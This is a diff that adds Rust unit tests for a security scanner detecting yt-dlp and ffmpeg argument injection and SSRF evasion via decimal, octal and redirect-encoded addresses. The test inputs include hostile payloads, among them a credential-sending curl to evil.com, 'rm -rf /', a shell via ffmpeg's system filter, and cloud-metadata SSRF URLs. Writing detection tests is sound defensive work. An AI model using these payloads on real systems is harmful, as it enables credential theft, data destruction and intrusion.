@@ -1235,4 +1235,152 @@ mod comprehensive_tests {
             "10k clean-input scans took {elapsed:?} — AC pre-filter not working efficiently"
         );
     }
+
+    // ────────────────────────────────────────────────────────────────────────
+    // Argument-based RCE patterns (CVE-2026-26331)
+    // ────────────────────────────────────────────────────────────────────────
+
+    #[test]
+    fn test_ytdlp_rce_netrc_cmd() {
+        let m = matcher();
+        let r = m.scan("ytdlp1", &[("cmd", "yt-dlp --netrc-cmd 'curl http://evil.com/creds'")]);
+        assert!(!r.matches.is_empty(), "yt-dlp --netrc-cmd should be detected");
+        assert!(r.matches.iter().any(|m| m.pattern_name == "ytdlp_rce_netrc_cmd"));
+    }
+
+    #[test]
+    fn test_ytdlp_rce_exec_flag() {
+        let m = matcher();
+        let r = m.scan("ytdlp2", &[("cmd", "yt-dlp --exec 'rm -rf /' https://example.com/video")]);
+        assert!(!r.matches.is_empty(), "yt-dlp --exec should be detected");
+        assert!(r.matches.iter().any(|m| m.category == "cmdi"));
+    }
+
+    #[test]
+    fn test_ytdlp_rce_plugin_dirs() {
+        let m = matcher();
+        let r = m.scan("ytdlp3", &[("cmd", "youtube-dl --plugin-dirs /tmp/evil https://example.com")]);
+        assert!(!r.matches.is_empty(), "youtube-dl --plugin-dirs should be detected");
+    }
+
+    #[test]
+    fn test_ytdlp_safe_usage_no_alert() {
+        let m = matcher();
+        let r = m.scan("ytdlp4", &[("cmd", "yt-dlp -f best https://youtube.com/watch?v=abc123")]);
+        let has_ytdlp_match = r.matches.iter().any(|m| m.pattern_name == "ytdlp_rce_netrc_cmd");
+        assert!(!has_ytdlp_match, "Safe yt-dlp usage should not trigger RCE pattern");
+    }
+
+    #[test]
+    fn test_ffmpeg_rce_filter_system() {
+        let m = matcher();
+        let r = m.scan("ffmpeg1", &[("cmd", "ffmpeg -i input.mp4 -vf 'system(/bin/sh)' output.mp4")]);
+        assert!(!r.matches.is_empty(), "ffmpeg -vf with system() should be detected");
+        assert!(r.matches.iter().any(|m| m.pattern_name == "ffmpeg_rce_filter"));
+    }
+
+    #[test]
+    fn test_ffmpeg_rce_filter_pipe() {
+        let m = matcher();
+        let r = m.scan("ffmpeg2", &[("cmd", "ffmpeg -i in.mp4 -vf 'drawtext=text|/etc/passwd' out.mp4")]);
+        assert!(!r.matches.is_empty(), "ffmpeg -vf with pipe should be detected");
+    }
+
+    #[test]
+    fn test_ffmpeg_safe_usage_no_alert() {
+        let m = matcher();
+        let r = m.scan("ffmpeg3", &[("cmd", "ffmpeg -i input.mp4 -c:v libx264 output.mp4")]);
+        let has_ffmpeg_match = r.matches.iter().any(|m| m.pattern_name == "ffmpeg_rce_filter");
+        assert!(!has_ffmpeg_match, "Safe ffmpeg usage should not trigger RCE pattern");
+    }
+
+    // ────────────────────────────────────────────────────────────────────────
+    // SSRF evasion patterns (CVE-2026-25545)
+    // ────────────────────────────────────────────────────────────────────────
+
+    #[test]
+    fn test_ssrf_decimal_ip_169_254() {
+        let m = matcher();
+        let r = m.scan("ssrf1", &[("url", "http://2852039166/latest/meta-data/")]);
+        assert!(!r.matches.is_empty(), "Decimal IP 2852039166 (169.254.169.254) should be detected");
+        assert!(r.matches.iter().any(|m| m.pattern_name == "ssrf_decimal_ip"));
+    }
+
+    #[test]
+    fn test_ssrf_decimal_ip_127_0_0_1() {
+        let m = matcher();
+        let r = m.scan("ssrf2", &[("url", "http://2130706433/admin")]);
+        assert!(!r.matches.is_empty(), "Decimal IP 2130706433 (127.0.0.1) should be detected");
+    }
+
+    #[test]
+    fn test_ssrf_astro_redirect() {
+        let m = matcher();
+        let r = m.scan("ssrf3", &[("url", "https://example.com/_astro/redir?url=http://169.254.169.254")]);
+        assert!(!r.matches.is_empty(), "Astro redirect SSRF should be detected");
+        assert!(r.matches.iter().any(|m| m.pattern_name == "ssrf_astro_redirect"));
+    }
+
+    #[test]
+    fn test_ssrf_astro_redirect_variant() {
+        let m = matcher();
+        let r = m.scan("ssrf4", &[("url", "/_astro/redirect?url=http://metadata.google.internal")]);
+        assert!(!r.matches.is_empty(), "Astro redirect variant should be detected");
+    }
+
+    #[test]
+    fn test_ssrf_dotted_octal_ip() {
+        let m = matcher();
+        let r = m.scan("ssrf5", &[("url", "http://0251.0376.0251.0376/latest/meta-data/")]);
+        assert!(!r.matches.is_empty(), "Dotted octal IP should be detected as SSRF evasion");
+        assert!(r.matches.iter().any(|m| m.pattern_name == "ssrf_dotted_octal_ip"));
+    }
+
+    #[test]
+    fn test_ssrf_dotted_octal_localhost() {
+        let m = matcher();
+        let r = m.scan("ssrf6", &[("url", "http://0177.0000.0000.0001/admin")]);
+        assert!(!r.matches.is_empty(), "Dotted octal 127.0.0.1 should be detected");
+    }
+
+    #[test]
+    fn test_ssrf_normal_url_no_alert() {
+        let m = matcher();
+        let r = m.scan("ssrf7", &[("url", "https://api.example.com/v1/users")]);
+        let has_ssrf_evasion = r.matches.iter().any(|m|
+            m.pattern_name == "ssrf_decimal_ip" ||
+            m.pattern_name == "ssrf_astro_redirect" ||
+            m.pattern_name == "ssrf_dotted_octal_ip"
+        );
+        assert!(!has_ssrf_evasion, "Normal URL should not trigger SSRF evasion patterns");
+    }
+
+    // ────────────────────────────────────────────────────────────────────────
+    // Arg-based RCE and SSRF evasion: AC pre-filter vs regex-only parity
+    // ────────────────────────────────────────────────────────────────────────
+
+    #[test]
+    fn test_new_patterns_ac_vs_regex_parity() {
+        let m_ac = matcher();
+        let m_no = matcher_no_ac();
+
+        let cases = [
+            ("cmd", "yt-dlp --netrc-cmd 'curl evil.com'"),
+            ("cmd", "ffmpeg -i in.mp4 -vf 'system(id)' out.mp4"),
+            ("url", "http://2852039166/latest/meta-data/"),
+            ("url", "/_astro/redir?url=http://169.254.169.254"),
+            ("url", "http://0251.0376.0251.0376/"),
+        ];
+
+        for (i, (field, value)) in cases.iter().enumerate() {
+            let id = format!("parity_{i}");
+            let r_ac = m_ac.scan(&id, &[(field, value)]);
+            let r_no = m_no.scan(&id, &[(field, value)]);
+            assert_eq!(
+                r_ac.matches.len(),
+                r_no.matches.len(),
+                "AC vs regex mismatch for input: {value}"
+            );
+        }
+    }
 }
